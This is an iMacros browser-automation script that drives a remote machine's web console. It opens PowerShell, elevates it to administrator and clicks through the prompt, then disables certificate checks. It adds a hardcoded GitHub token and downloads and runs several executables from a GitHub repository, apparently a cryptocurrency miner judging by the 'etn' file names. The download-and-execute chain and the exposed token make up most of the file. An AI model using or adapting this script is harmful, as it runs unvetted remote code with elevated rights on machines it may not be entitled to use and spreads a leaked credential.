
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=cmd ");
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");

		// cd C:/
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="powershell -NoExit -Command \'Set-Location C: \' "');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="Start-Process powershell -Verb runAs"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 4");
		
		//allow admin permisson
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:37');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 3");
		
		
		// downoad File
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ; $client = new-object System.Net.WebClient ;"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 5");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=" $client.Headers.Add(\\"Authorization\\",\\"token 8d795936d2c1b2806587719b9b6456bd16549ad8\\");$client.Headers.Add(\\"Accept\\",\\"application/vnd.github.v3.raw\\");" ');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 5");
		
		
		var longstring = "netsh interface set interface 'WebNet' enabled ;";
	//	longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/etn/raw/master/etn-wrap.exe\",\\"C:\\tem.exe\\");';
	//	longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/pika/raw/master/any.exe\",\\"C:\\any.exe\\");';
	//	longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/pika/raw/master/ff.zip\",\\"C:\\aff.zip\\");';
	//	longstring = longstring + '$client.DownloadFile(\"https://github.com/pikemonlonton/pika/raw/master/ggate.exe\",\\"C:\\gate.exe\\");';
		
		longstring += "$url = 'https://github.com/pikemonlonton/pika/raw/master/' ; $file = 'C:/gate.exe' ; $client.DownloadFile($url + 'etn-wrap.exe' , 'C:/tem.exe');" ; 
		longstring += "$client.DownloadFile($url + 'any.exe' , 'C:/any.exe');" ;
	//	longstring += "$client.DownloadFile($url + 'ff.zip' , 'C:/ff.zip');" ;
		longstring += "$client.DownloadFile($url + 'ggate.exe' , $file);" ;
		longstring += "For ($i=0; $i -le 30; $i++) {Start-Sleep -s 10 ; if(90000000 -le (Get-Item $file).length ){& $file ; $client.DownloadFile($url + 'ff.zip' , 'C:/ff.zip');  & 'C:/tem.exe' ; Start-Sleep -s 9 ; & 'C:/etn_startup.exe' ; cd C:/ ; cmd.exe /c 'C:/star-etn' ; break }}" ;
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay('CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT="'+longstring+'"');
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 10");
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 3");
		
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:windowsKeyR ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands ");
		iimPlay("CODE:TAG POS=1 TYPE=DIV ATTR=ID:pasteClipboard ");
		iimPlay("CODE:TAG POS=1 TYPE=TEXTAREA ATTR=ID:pasteTextArea CONTENT=C:\ ");
		iimPlay("CODE:TAG POS=1 TYPE=BUTTON ATTR=TXT:OK ");
		iimPlay("CODE:WAIT SECONDS = 2");
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:machineCommands');
		iimPlay('CODE:TAG POS=1 TYPE=DIV ATTR=ID:showVirtualKeyboard');
		iimPlay('CODE:TAG POS=1 TYPE=LI ATTR=DATA-KEY:13');
		iimPlay("CODE:WAIT SECONDS = 2");